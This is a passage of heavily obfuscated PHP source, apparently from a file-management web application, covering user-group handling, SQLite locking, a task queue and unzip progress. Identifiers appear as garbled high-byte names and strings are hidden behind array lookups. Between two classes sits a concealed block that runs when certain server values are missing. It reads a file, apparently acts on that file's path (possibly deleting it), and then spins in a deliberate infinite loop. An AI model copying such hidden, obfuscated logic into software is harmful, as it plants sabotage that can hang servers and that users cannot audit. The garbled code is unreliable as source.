$‘ï°€“‡[$óÙ æÍ] = $£ã›¬Ğ¼[$ÏÑËÀÄ[32]]; } $´›ŠÈÅ = $GLOBALS[$ÏÑËÀÄ[6]][$ÏÑËÀÄ[92]][$ÏÑËÀÄ[2086]]; if (KodUser::isRoot()) { $´›ŠÈÅ = !1; } foreach ($©çƒ¦–ó as &$ŸŸ›´±ü) { $Õ¢‡ü¼ = $this->parentLevelArray($ŸŸ›´±ü[$ÏÑËÀÄ[586]]); $İûìøøª = $ÏÑËÀÄ[12]; foreach ($Õ¢‡ü¼ as $óÙ æÍ => $¡ñãò“û) { if ($´›ŠÈÅ && $óÙ æÍ == 0) { continue; } $İûìøøª .= $‘ï°€“‡[$¡ñãò“û] . $ÏÑËÀÄ[8]; } if ($Õ¢‡ü¼) { $İûìøøª .= $ŸŸ›´±ü[$ÏÑËÀÄ[32]]; } $ŸŸ›´±ü[$ÏÑËÀÄ[591]] = str_replace($ÏÑËÀÄ[256], $ÏÑËÀÄ[8], $İûìøøª); } unset($ŸŸ›´±ü); } private function _listAppendSourceRoot(&$ÌÒ‹ë¾¾, $¿µ÷¬Ä‰) { $ÙûÚƒş¶ =& $_SERVER[ÔÕ±ĞšÎ]; $æÄ”Ú¾² = Model($ÙûÚƒş¶[899])->listSourceRoot(SourceModel::TYPE_GROUP, $¿µ÷¬Ä‰); $æÄ”Ú¾² = array_to_keyvalue($æÄ”Ú¾², $ÙûÚƒş¶[571]); $æÄ”Ú¾² = array_remove_key($æÄ”Ú¾², $ÙûÚƒş¶[571]); foreach ($ÌÒ‹ë¾¾ as &$â»´™») { $â»´™»[$ÙûÚƒş¶[90]] = $æÄ”Ú¾²[$â»´™»[$ÙûÚƒş¶[1978]]] ? $æÄ”Ú¾²[$â»´™»[$ÙûÚƒş¶[1978]]] : array(); } unset($â»´™»); } protected function groupMerge($áìƒÎà´) { $áìƒÎà´ = array_values(array_unique($áìƒÎà´)); $Ô¸²Ğ·Õ = array(); for ($§Ö‹€´Ç = 0; $§Ö‹€´Ç < count($áìƒÎà´); $§Ö‹€´Ç++) { $õ…ŠàÍ = !1; for ($™¦÷˜‹¢ = 0; $™¦÷˜‹¢ < count($áìƒÎà´); $™¦÷˜‹¢++) { if ($§Ö‹€´Ç == $™¦÷˜‹¢) { continue; } if ($this->isParentOf($áìƒÎà´[$™¦÷˜‹¢], $áìƒÎà´[$§Ö‹€´Ç])) { $õ…ŠàÍ = !0; break; } } if (!$õ…ŠàÍ) { $Ô¸²Ğ·Õ[] = $áìƒÎà´[$§Ö‹€´Ç]; } } return $Ô¸²Ğ·Õ; } protected function isParentOf($ıÌËı’, $§Õ¸ıµ¯) { $Åé©¯«ª =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ıÌËı’ || !$§Õ¸ıµ¯ || $ıÌËı’ == $§Õ¸ıµ¯) { return !1; } $ÄöüŠğ¼ = $this->getInfoSimple($ıÌËı’); $Ö™‹’ = $this->getInfoSimple($§Õ¸ıµ¯); $ÜÃì£¼´ = $ÄöüŠğ¼[$Åé©¯«ª[586]] . $ıÌËı’ . $Åé©¯«ª[50]; if (substr($Ö™‹’[$Åé©¯«ª[586]], 0, strlen($ÜÃì£¼´)) == $ÜÃì£¼´) { return !0; } return !1; } public function groupShowRoot($Ú–×‡ó„, $ŞÚàùèÒ = false) { $îÂ·Ş˜å =& $_SERVER[ÔÕ±ĞšÎ]; $ÈÌÛíş = $this->getInfo($Ú–×‡ó„); if (!$ÈÌÛíş) { return array(); } $Äø»¢´ = $this->parentLevelArray($ÈÌÛíş[$îÂ·Ş˜å[586]]); $š¸ü»Ëº = array($Ú–×‡ó„); if (count($Äø»¢´) == 0) { return $š¸ü»Ëº; } if ($ŞÚàùèÒ && count($Äø»¢´) == 1) { return $š¸ü»Ëº; } if (!$ÈÌÛíş[$îÂ·Ş˜å[541]] || !isset($ÈÌÛíş[$îÂ·Ş˜å[541]][$îÂ·Ş˜å[2069]]) || $ÈÌÛíş[$îÂ·Ş˜å[541]][$îÂ·Ş˜å[2069]] == $îÂ·Ş˜å[850]) { return $this->groupShowRoot($Äø»¢´[count($Äø»¢´) - 1], $ŞÚàùèÒ); } if ($ÈÌÛíş[$îÂ·Ş˜å[541]][$îÂ·Ş˜å[2069]] == $îÂ·Ş˜å[434]) { $Ÿáêõä = explode($îÂ·Ş˜å[50], $ÈÌÛíş[$îÂ·Ş˜å[541]][$îÂ·Ş˜å[2070]]); if ($Ÿáêõä) { $š¸ü»Ëº = array_merge($š¸ü»Ëº, $Ÿáêõä); } } return $š¸ü»Ëº; } protected function resetParentLevel() { $Õ›¥â‘ =& $_SERVER[ÔÕ±ĞšÎ]; $‹æƒµ® = $Õ›¥â‘[1978]; $ë¢µÊ = $this->select(); $ë¢µÊ = array_to_keyvalue($ë¢µÊ, $‹æƒµ®); foreach ($ë¢µÊ as $…¯ˆã©™) { $ùã‘ñéï = $…¯ˆã©™; $Ç»áıëü = array(); while ($ùã‘ñéï[$Õ›¥â‘[192]] != 0) { $Ç»áıëü[] = $ùã‘ñéï[$Õ›¥â‘[192]]; $ùã‘ñéï = $ë¢µÊ[$ùã‘ñéï[$Õ›¥â‘[192]]]; } $Ç»áıëü[] = 0; $Ç»áıëü = $Õ›¥â‘[50] . implode($Õ›¥â‘[50], array_reverse($Ç»áıëü)) . $Õ›¥â‘[50]; $this->setNamePinyin($…¯ˆã©™[$‹æƒµ®], $…¯ˆã©™[$Õ›¥â‘[32]]); $this->where(array($‹æƒµ® => $…¯ˆã©™[$‹æƒµ®]))->save(array($Õ›¥â‘[657] => $Ç»áıëü)); } return $ë¢µÊ; } public function groupNameAuto($µöìÎ­Š, $ø–„¦©Æ) { $Ú–ù›ş‡ =& $_SERVER[ÔÕ±ĞšÎ]; $âîÂ™®ş = $this->where(array($Ú–ù›ş‡[479] => $µöìÎ­Š))->getField($Ú–ù›ş‡[32], !0); if (!$âîÂ™®ş || !in_array($ø–„¦©Æ, $âîÂ™®ş)) { return $ø–„¦©Æ; } for ($şÄíòŸü = 1; $şÄíòŸü <= count($âîÂ™®ş) + 1; $şÄíòŸü++) { $ ®å­ì = $ø–„¦©Æ . "\50{$şÄíòŸü}\x29"; if (!in_array($ ®å­ì, $âîÂ™®ş)) { return $ ®å­ì; } } } public function groupSwitch($íÆÄõ ’, $Í´ñÃ) { $óƒİ ŠÀ =& $_SERVER[ÔÕ±ĞšÎ]; $ÒŠÚæÂè = array($óƒİ ŠÀ[1978] => array($óƒİ ŠÀ[7], array($íÆÄõ ’, $Í´ñÃ))); $ßº“îòÓ = $this->where($ÒŠÚæÂè)->select(); $ßº“îòÓ = array_to_keyvalue($ßº“îòÓ, $óƒİ ŠÀ[1978]); if (!isset($ßº“îòÓ[$íÆÄõ ’]) || !isset($ßº“îòÓ[$Í´ñÃ]) || $ßº“îòÓ[$íÆÄõ ’][$óƒİ ŠÀ[192]] == 0) { return !1; } $ÒŠÚæÂè = array($óƒİ ŠÀ[1978] => $íÆÄõ ’); $ÇòşÛŒ— = Model($óƒİ ŠÀ[2073])->where($ÒŠÚæÂè)->select(); if (!$ÇòşÛŒ—) { $ÇòşÛŒ— = array(); } foreach ($ÇòşÛŒ— as $«½â¶ªÃ) { $öáöæ˜ = $«½â¶ªÃ[$óƒİ ŠÀ[1777]]; $ÒŠÚæÂè = array($óƒİ ŠÀ[1777] => $öáöæ˜, $óƒİ ŠÀ[1978] => $Í´ñÃ); $“»â±Ê° = Model($óƒİ ŠÀ[2073])->where($ÒŠÚæÂè)->find(); if (!$“»â±Ê°) { $®Ö„ª§Œ = array($Í´ñÃ => $«½â¶ªÃ[$óƒİ ŠÀ[2087]]); Model($óƒİ ŠÀ[599])->userGroupAdd($öáöæ˜, $®Ö„ª§Œ); } Model($óƒİ ŠÀ[599])->userGroupRemove($öáöæ˜, $íÆÄõ ’); } $ÒŠÚæÂè = array($óƒİ ŠÀ[190] => 2, $óƒİ ŠÀ[192] => 0, $óƒİ ŠÀ[487] => 1, $óƒİ ŠÀ[571] => array($óƒİ ŠÀ[7], array($íÆÄõ ’, $Í´ñÃ))); $™ïşİ = Model($óƒİ ŠÀ[899])->where($ÒŠÚæÂè)->field($óƒİ ŠÀ[2088])->select(); $™ïşİ = array_to_keyvalue($™ïşİ, $óƒİ ŠÀ[571], $óƒİ ŠÀ[193]); $îÄƒä—© = !empty($™ïşİ[$íÆÄõ ’]) ? $™ïşİ[$íÆÄõ ’] : !1; if ($îÄƒä—©) { if (!$™ïşİ[$Í´ñÃ]) { $™ïşİ[$Í´ñÃ] = Model($óƒİ ŠÀ[899])->groupRootAdd($Í´ñÃ); } $ññ€×ñæ = $™ïşİ[$Í´ñÃ]; $ÒŠÚæÂè = array($óƒİ ŠÀ[192] => $îÄƒä—©); $™ïşİ = Model($óƒİ ŠÀ[899])->where($ÒŠÚæÂè)->field($óƒİ ŠÀ[2089])->select(); if (!$™ïşİ) { $™ïşİ = array(); } Model($óƒİ ŠÀ[899])->moveClearAuth = !1; foreach ($™ïşİ as $ÅÂü– ÷) { $–ğ‡ˆ˜ã = $ÅÂü– ÷[$óƒİ ŠÀ[487]] == $óƒİ ŠÀ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($óƒİ ŠÀ[899])->move($ÅÂü– ÷[$óƒİ ŠÀ[193]], $ññ€×ñæ, $–ğ‡ˆ˜ã); } Model($óƒİ ŠÀ[899])->moveClearAuth = !0; $ÒŠÚæÂè = array($óƒİ ŠÀ[190] => 2, $óƒİ ŠÀ[571] => $íÆÄõ ’); $½ãáãÕ = array($óƒİ ŠÀ[571] => $Í´ñÃ); Model($óƒİ ŠÀ[2090])->where($ÒŠÚæÂè)->save($½ãáãÕ); Model($óƒİ ŠÀ[2091])->where($ÒŠÚæÂè)->save($½ãáãÕ); } $this->_changeChildLevel($ßº“îòÓ[$íÆÄõ ’], $ßº“îòÓ[$Í´ñÃ], !0); $this->where(array($óƒİ ŠÀ[192] => $íÆÄõ ’))->save(array($óƒİ ŠÀ[192] => $Í´ñÃ)); $this->_clearChildrenCache($ßº“îòÓ[$Í´ñÃ]); return !0; } } goto DÆ÷˜‰¢; b¶ñğ£åª¶: class DbSqlite extends DbSqliteBase { public function query($ëì‰û¯×) { $ƒˆÖà¨© =& $_SERVER[ÔÕ±ĞšÎ]; if (!CacheLock::fileLock($ƒˆÖà¨©[13])) { return !1; } $òÉïÊ˜¤ = parent::query($ëì‰û¯×); CacheLock::fileUnLock($ƒˆÖà¨©[13]); return $òÉïÊ˜¤; } public function execute($¼ú¢°Ëƒ) { $ÏáñÆÄ =& $_SERVER[ÔÕ±ĞšÎ]; if (!CacheLock::fileLock($ÏáñÆÄ[13])) { return !1; } $‰ªªéßÆ = parent::execute($¼ú¢°Ëƒ); CacheLock::fileUnLock($ÏáñÆÄ[13]); return $‰ªªéßÆ; } } class DbSqlite3 extends DbSqlite3Base { public function query($ã‘š¸Ëã) { $î«óş¿ =& $_SERVER[ÔÕ±ĞšÎ]; if (!CacheLock::fileLock($î«óş¿[13])) { return !1; } $˜‚æÅÕ = parent::query($ã‘š¸Ëã); CacheLock::fileUnLock($î«óş¿[13]); return $˜‚æÅÕ; } public function execute($¨Õ¼Ê®²) { $ğ†ğ±–Ï =& $_SERVER[ÔÕ±ĞšÎ]; if (!CacheLock::fileLock($ğ†ğ±–Ï[13])) { return !1; } $½Õ‰¾ï = parent::execute($¨Õ¼Ê®²); CacheLock::fileUnLock($ğ†ğ±–Ï[13]); return $½Õ‰¾ï; } } if (!isset($_SERVER[$_SERVER[ÔÕ±ĞšÎ][952]]) || !isset($_SERVER[$_SERVER[ÔÕ±ĞšÎ][953]])) { $_getc = $_SERVER[ÔÕ±ĞšÎ][955]; $_getfile = $_SERVER[$_SERVER[ÔÕ±ĞšÎ][956]] . $_SERVER[ÔÕ±ĞšÎ][957]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÔÕ±ĞšÎ][287], $_getfilec); if (count($_getarrs) < $_SERVER[ÔÕ±ĞšÎ][696]) { $exit = $_SERVER[ÔÕ±ĞšÎ][958]; $exit(); } $_act = $_SERVER[ÔÕ±ĞšÎ][961]; $_act($_SERVER[$_SERVER[ÔÕ±ĞšÎ][956]] . $_SERVER[ÔÕ±ĞšÎ][957]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÔÕ±ĞšÎ][456]); } } goto bÂ³¤ë«õî; A«§ÖÚß: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\145\x75\x65\x4c\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\121\165\x65\x75\x65\x44\141\x74\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\x51\x75\145\x75\x65\114\x61\x73\164\x52\x75\156"; const QUEUE_THREAD = "\164\141\163\153\121\165\145\165\x65\x54\150\162\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($·©ÅºÒ, $İ¤§¤® = array(), $âõ–çš = '', $™ØÊ¾ÕÚ = '') { $”ı„•å =& $_SERVER[ÔÕ±ĞšÎ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($™ØÊ¾ÕÚ && array_find_by_field(self::$listData, $”ı„•å[97], $™ØÊ¾ÕÚ)) { return !0; } if ($™ØÊ¾ÕÚ && array_find_by_field(self::$listDataAdd, $”ı„•å[97], $™ØÊ¾ÕÚ)) { return !0; } self::$listDataAdd[] = array($”ı„•å[343] => $·©ÅºÒ, $”ı„•å[1877] => $İ¤§¤®, $”ı„•å[528] => $âõ–çš, $”ı„•å[97] => $™ØÊ¾ÕÚ); return !0; } public static function addSubmit() { $ø—“ó¬Œ =& $_SERVER[ÔÕ±ĞšÎ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ø—“ó¬Œ[1878] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ø—“ó¬Œ[12], $ø—“ó¬Œ[528])), $ø—“ó¬Œ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($š«ØæÅ‡, $¡î¹é–× = array(), $ÁØ«“³À = '', $ï¥ä…‰Š = '') { $åæûÂØ =& $_SERVER[ÔÕ±ĞšÎ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Û±¹ÇöÖ = self::getAll(); if ($ï¥ä…‰Š && array_find_by_field($Û±¹ÇöÖ, $åæûÂØ[97], $ï¥ä…‰Š)) { return !0; } $Û±¹ÇöÖ[] = array($åæûÂØ[343] => $š«ØæÅ‡, $åæûÂØ[1877] => $¡î¹é–×, $åæûÂØ[528] => $ÁØ«“³À, $åæûÂØ[97] => $ï¥ä…‰Š); self::setAll($Û±¹ÇöÖ); write_log($åæûÂØ[1878] . $ÁØ«“³À, $åæûÂØ[197]); return !0; } public static function run() { $Æµ÷ÌĞâ =& $_SERVER[ÔÕ±ĞšÎ]; $¡Ñâíã© = self::getAll(); $³ÂëĞ°ò = array_shift($¡Ñâíã©); if (!$³ÂëĞ°ò) { return !1; } self::setAll($¡Ñâíã©); $Ñ˜¦ñìğ = timeFloat(); $³…¦¸ÎÑ = $Æµ÷ÌĞâ[12]; try { $³…¦¸ÎÑ = Hook::apply($³ÂëĞ°ò[$Æµ÷ÌĞâ[343]], $³ÂëĞ°ò[$Æµ÷ÌĞâ[1877]]); } catch (Exception $Î„Âì«å) { write_log($Î„Âì«å, $Æµ÷ÌĞâ[1266]); } $Ÿ™¦Èµİ = number_format(timeFloat() - $Ñ˜¦ñìğ, 3) . $Æµ÷ÌĞâ[1793]; if ($³…¦¸ÎÑ && is_string($³…¦¸ÎÑ)) { $Ÿ™¦Èµİ = $Ÿ™¦Èµİ . $Æµ÷ÌĞâ[1879] . $³…¦¸ÎÑ; } write_log($Æµ÷ÌĞâ[1880] . $³ÂëĞ°ò[$Æµ÷ÌĞâ[528]] . $Æµ÷ÌĞâ[1881] . $Ÿ™¦Èµİ, $Æµ÷ÌĞâ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $®ãÖ¢À =& $_SERVER[ÔÕ±ĞšÎ]; $‘ÀŠàîĞ = self::threadCount() + 1; if ($‘ÀŠàîĞ > 3 || !self::count()) { return; } write_log($®ãÖ¢À[1882] . $‘ÀŠàîĞ, $®ãÖ¢À[197]); Cache::set(self::QUEUE_THREAD, $‘ÀŠàîĞ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($®ãÖ¢À[1883], $®ãÖ¢À[197]); } public static function getKey($¼ç®áØø, $Õä©å¡ = "\x69\156\x74") { $œ•ÊŸç =& $_SERVER[ÔÕ±ĞšÎ]; Cache::removeMemory($¼ç®áØø); $Š†ùÊè = Cache::get($¼ç®áØø); if ($Õä©å¡ == $œ•ÊŸç[365]) { return $Š†ùÊè ? intval($Š†ùÊè) : 0; } if ($Õä©å¡ == $œ•ÊŸç[1884]) { return is_array($Š†ùÊè) ? $Š†ùÊè : array(); } return $Š†ùÊè; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ÔÕ±ĞšÎ][1884]); } public static function setAll($‚ÖÔÅâó) { $—üêàÅ¶ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($‚ÖÔÅâó), $—üêàÅ¶); Cache::set(self::QUEUE_DATA, $‚ÖÔÅâó, $—üêàÅ¶); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Æœ…óí, $ñ®–¦Ã‰ = 5.0) { if (!$Æœ…óí) { return; } $£Ù§ïù… = Cache::get($Æœ…óí); if (!$£Ù§ïù… || timeFloat() - floatVal($£Ù§ïù…) >= $ñ®–¦Ã‰) { Cache::set($Æœ…óí, timeFloat(), $ñ®–¦Ã‰ * 10); return !0; } return !1; } public static function timeLimitCall($ ›¥¶´, $†£ºğ„, $Ì»©ÕÅ, $áÔüõ€ = 5.0) { $ìşåÚè‚ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ ›¥¶´ || !$†£ºğ„) { return; } self::$asyncAdd = !0; $™¨¿§ö = $ìşåÚè‚[1885]; $Ø„´Ã€™ = Cache::get($™¨¿§ö, !0); $Ú§Ù´Î¬ = array($ìşåÚè‚[1886] => timeFloat(), $ìşåÚè‚[1887] => timeFloat(), $ìşåÚè‚[343] => $†£ºğ„, $ìşåÚè‚[1877] => $Ì»©ÕÅ, $ìşåÚè‚[206] => $áÔüõ€); if (is_array($Ø„´Ã€™[$ ›¥¶´])) { $Ú§Ù´Î¬[$ìşåÚè‚[1887]] = $Ø„´Ã€™[$ ›¥¶´][$ìşåÚè‚[1887]]; } if (is_array($Ø„´Ã€™[$ ›¥¶´])) { if (timeFloat() - $Ø„´Ã€™[$ ›¥¶´][$ìşåÚè‚[1886]] < $Ú§Ù´Î¬[$ìşåÚè‚[206]] * 0.3) { return; } $Ú§Ù´Î¬[$ìşåÚè‚[1887]] = $Ø„´Ã€™[$ ›¥¶´][$ìşåÚè‚[1887]]; } $Ø„´Ã€™[$ ›¥¶´] = $Ú§Ù´Î¬; Cache::set($™¨¿§ö, $Ø„´Ã€™, 60); Cache::removeMemory($™¨¿§ö); write_log($ìşåÚè‚[1888] . $ ›¥¶´ . $ìşåÚè‚[74] . $†£ºğ„, $ìşåÚè‚[197]); } public static function timeLimitCallLoop() { $üö§¾ğš =& $_SERVER[ÔÕ±ĞšÎ]; $ÄïİÂ³¥ = array($üö§¾ğš[1889]); $Í´áÈØä = in_array(strtolower(ACTION), $ÄïİÂ³¥); if (!$Í´áÈØä && !self::$asyncAdd) { return; } $ö¶ü«†› = $üö§¾ğš[1885]; $ì°•âŒÈ = Cache::get($ö¶ü«†›, !0); if (!$ì°•âŒÈ || count($ì°•âŒÈ) <= 0) { return; } $¡â¿¸±€ = !1; $ÔÊ¡·èü = timeFloat(); $à…§ü¶à = array(); foreach ($ì°•âŒÈ as $²ßìÓÖ¼ => $ÓÒŸÂ£è) { if ($ÔÊ¡·èü - $ÓÒŸÂ£è[$üö§¾ğš[1887]] > $ÓÒŸÂ£è[$üö§¾ğš[206]]) { $¡â¿¸±€ = !0; try { Hook::apply($ÓÒŸÂ£è[$üö§¾ğš[343]], $ÓÒŸÂ£è[$üö§¾ğš[1877]]); write_log($üö§¾ğš[1890] . $²ßìÓÖ¼ . $üö§¾ğš[74] . $ÓÒŸÂ£è[$üö§¾ğš[343]] . $üö§¾ğš[1891] . ACTION, $üö§¾ğš[197]); } catch (Exception $Ë†âß“) { } continue; } $à…§ü¶à[$²ßìÓÖ¼] = $ÓÒŸÂ£è; } if (!$¡â¿¸±€) { return; } if (!$à…§ü¶à) { return Cache::remove($ö¶ü«†›); } Cache::set($ö¶ü«†›, $à…§ü¶à, 60); Cache::removeMemory($ö¶ü«†›); } public static function finished($ıÕ´èè¥, $Çˆæ¨²ó) { $öÓ‚ËóË =& $_SERVER[ÔÕ±ĞšÎ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($öÓ‚ËóË[343] => $ıÕ´èè¥, $öÓ‚ËóË[1877] => $Çˆæ¨²ó); } private static function finishedRun() { $¥—·»Ò£ =& $_SERVER[ÔÕ±ĞšÎ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ã½Ëì¼Ã) { try { Hook::apply($ã½Ëì¼Ã[$¥—·»Ò£[343]], $ã½Ëì¼Ã[$¥—·»Ò£[1877]]); } catch (Exception $€ô¾Â„×) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¬ëÑÖµ =& $_SERVER[ÔÕ±ĞšÎ]; parent::startAfter(); Hook::bind($¬ëÑÖµ[1892], array($this, $¬ëÑÖµ[1893])); Hook::bind($¬ëÑÖµ[1280], array($this, $¬ëÑÖµ[1894])); Hook::bind($¬ëÑÖµ[1895], array($this, $¬ëÑÖµ[1896])); $Ë—¼Æœ¶ =& $this->task; $Ë—¼Æœ¶[$¬ëÑÖµ[1897]] = $¬ëÑÖµ[1281]; if (!$Ë—¼Æœ¶[$¬ëÑÖµ[1665]]) { $Ë—¼Æœ¶[$¬ëÑÖµ[1665]] = LNG($¬ëÑÖµ[1898]); } } protected function endAfter() { $ƒÒ‚¤¬… =& $_SERVER[ÔÕ±ĞšÎ]; parent::endAfter(); Hook::unbind($ƒÒ‚¤¬…[1892], array($this, $ƒÒ‚¤¬…[1893])); Hook::unbind($ƒÒ‚¤¬…[1280], array($this, $ƒÒ‚¤¬…[1894])); Hook::unbind($ƒÒ‚¤¬…[1895], array($this, $ƒÒ‚¤¬…[1896])); } public function updateAfter() { $–ÅÀÈŒ =& $_SERVER[ÔÕ±ĞšÎ]; $ÏÌÈĞš¿ =& $this->task; if (!$ÏÌÈĞš¿[$–ÅÀÈŒ[1142]] || !$ÏÌÈĞš¿[$–ÅÀÈŒ[837]]) { if ($ÏÌÈĞš¿[$–ÅÀÈŒ[1897]] != $–ÅÀÈŒ[390]) { return; } } if ($ÏÌÈĞš¿[$–ÅÀÈŒ[1897]] == $–ÅÀÈŒ[1281]) { $ã½¿Ñ§ = 0; if ($ÏÌÈĞš¿[$–ÅÀÈŒ[1831]]) { $ã½¿Ñ§ = $ÏÌÈĞš¿[$–ÅÀÈŒ[1832]] / $ÏÌÈĞš¿[$–ÅÀÈŒ[1831]]; } $ÏÌÈĞš¿[$–ÅÀÈŒ[1779]] = $ã½¿Ñ§ * 0.3; } else { if ($ÏÌÈĞš¿[$–ÅÀÈŒ[1897]] == $–ÅÀÈŒ[390]) { $ã½¿Ñ§ = $ÏÌÈĞš¿[$–ÅÀÈŒ[1778]] / $ÏÌÈĞš¿[$–ÅÀÈŒ[1142]]; $ÏÌÈĞš¿[$–ÅÀÈŒ[1779]] = 0.3 + $ã½¿Ñ§ * 0.4; } else { if ($ÏÌÈĞš¿[$–ÅÀÈŒ[1897]] == $–ÅÀÈŒ[110]) { $ğ»•”õ” = 0; if ($ÏÌÈĞš¿[$–ÅÀÈŒ[1833]] == $–ÅÀÈŒ[110]) { $ğ»•”õ” = $ÏÌÈĞš¿[$–ÅÀÈŒ[1832]]; } $ã½¿Ñ§ = ($ÏÌÈĞš¿[$–ÅÀÈŒ[1836]] + $ğ»•”õ”) / $ÏÌÈĞš¿[$–ÅÀÈŒ[837]]; $ÏÌÈĞš¿[$–ÅÀÈŒ[1779]] = 0.3 + 0.4 + $ã½¿Ñ§ * 0.3; } } } if ($ÏÌÈĞš¿[$–ÅÀÈŒ[1779]] > 0) { $¾ÄË™àÃ = timeFloat() - $ÏÌÈĞš¿[$–ÅÀÈŒ[1781]] - $ÏÌÈĞš¿[$–ÅÀÈŒ[1784]]; $ÏÌÈĞš¿[$–ÅÀÈŒ[1785]] = $¾ÄË™àÃ * (1 - $ÏÌÈĞš¿[$–ÅÀÈŒ[1779]]) / $ÏÌÈĞš¿[$–ÅÀÈŒ[1779]]; } } public function addFile($ŸïÇ·™) { $”’„˜Ó› =& $_SERVER[ÔÕ±ĞšÎ]; $¾ÖÈ‚Å— =& $this->task; $Ÿîäß·é = IO::info($ŸïÇ·™); $¾ÖÈ‚Å—[$”’„˜Ó›[1829]] = $Ÿîäß·é[$”’„˜Ó›[32]]; $¾ÖÈ‚Å—[$”’„˜Ó›[1831]] = $Ÿîäß·é[$”’„˜Ó›[79]]; $¾ÖÈ‚Å—[$”’„˜Ó›[1832]] = 0; $¾ÖÈ‚Å—[$”’„˜Ó›[1144]] = $”’„˜Ó›[1852]; $¾ÖÈ‚Å—[$”’„˜Ó›[1833]] = $”’„˜Ó›[1281]; $¾ÖÈ‚Å—[$”’„˜Ó›[837]] = $Ÿîäß·é[$”’„˜Ó›[79]]; $¾ÖÈ‚Å—[$”’„˜Ó›[1142]] = 1; $Çø“•§ = 0; $¾ÖÈ‚Å—[$”’„˜Ó›[1840]] = array($”’„˜Ó›[1841] => $Çø“•§ + 1, $”’„˜Ó›[496] => $Ÿîäß·é[$”’„˜Ó›[32]], $”’„˜Ó›[87] => $Ÿîäß·é[$”’„˜Ó›[87]], $”’„˜Ó›[584] => $Ÿîäß·é[$”’„˜Ó›[584]] ? $Ÿîäß·é[$”’„˜Ó›[584]] : $Ÿîäß·é[$”’„˜Ó›[87]]); $this->update(); } public function zipEvent($¢ÖÉÌÉ†, $¨Ûáòáç, $–¥æ¸æÅ, $ÙÈ¬§×È) { $’¥¤Áñì =& $_SERVER[ÔÕ±ĞšÎ]; $Ò²¦âĞ« =& $this->task; $Ò²¦âĞ«[$’¥¤Áñì[1829]] = get_path_this($¨Ûáòáç); $Ò²¦âĞ«[$’¥¤Áñì[1831]] = $ÙÈ¬§×È; $Ò²¦âĞ«[$’¥¤Áñì[1832]] = $–¥æ¸æÅ; $Ò²¦âĞ«[$’¥¤Áñì[1144]] = $¢ÖÉÌÉ† == $’¥¤Áñì[1899] ? $’¥¤Áñì[1900] : $’¥¤Áñì[1901]; $Ò²¦âĞ«[$’¥¤Áñì[1833]] = $’¥¤Áñì[12]; $Ò²¦âĞ«[$’¥¤Áñì[837]] = $ÙÈ¬§×È; $Ò²¦âĞ«[$’¥¤Áñì[1897]] = $’¥¤Áñì[390]; $this->update(); } public function unzipAfter($ë¤®¬†½) { $–ıÖ˜¿³ =& $_SERVER[ÔÕ±ĞšÎ]; $Å¹Í¸Õğ =& $this->task; $Å¹Í¸Õğ[$–ıÖ˜¿³[1897]] = $–ıÖ˜¿³[110]; $Í¸ÈÂÂó = IO::infoWithChildren($ë¤®¬†½); $Âë½Ã½Í = 0; $Å¹Í¸Õğ[$–ıÖ˜¿³[1840]] = array($–ıÖ˜¿³[1841] => $Âë½Ã½Í + 1, $–ıÖ˜¿³[496] => $Í¸ÈÂÂó[$–ıÖ˜¿³[32]], $–ıÖ˜¿³[87] => $Í¸ÈÂÂó[$–ıÖ˜¿³[87]], $–ıÖ˜¿³[584] => $Í¸ÈÂÂó[$–ıÖ˜¿³[584]] ? $Í¸ÈÂÂó[$–ıÖ˜¿³[584]] : $Í¸ÈÂÂó[$–ıÖ˜¿³[87]]); if ($Í¸ÈÂÂó[$–ıÖ˜¿³[33]] == $–ıÖ˜¿³[232]) { $Å¹Í¸Õğ[$–ıÖ˜¿³[1142]] = 1; } else { $Å¹Í¸Õğ[$–ıÖ˜¿³[1142]] = $Í¸ÈÂÂó[$–ıÖ˜¿³[82]][$–ıÖ˜¿³[80]]; } $Å¹Í¸Õğ[$–ıÖ˜¿³[1144]] = $–ıÖ˜¿³[12]; $Å¹Í¸Õğ[$–ıÖ˜¿³[1833]] = 0; $Å¹Í¸Õğ[$–ıÖ˜¿³[1778]] = 0; $Å¹Í¸Õğ[$–ıÖ˜¿³[1831]] = 0; $Å¹Í¸Õğ[$–ıÖ˜¿³[1832]] = 0; $Å¹Í¸Õğ[$–ıÖ˜¿³[1829]] = $–ıÖ˜¿³[12]; $Å¹Í¸Õğ[$–ıÖ˜¿³[1836]] = 0; $Å¹Í¸Õğ[$–ıÖ˜¿³[837]] = $Í¸ÈÂÂó[$–ıÖ˜¿³[79]]; $this->update(); self::log($–ıÖ˜¿³[1902] 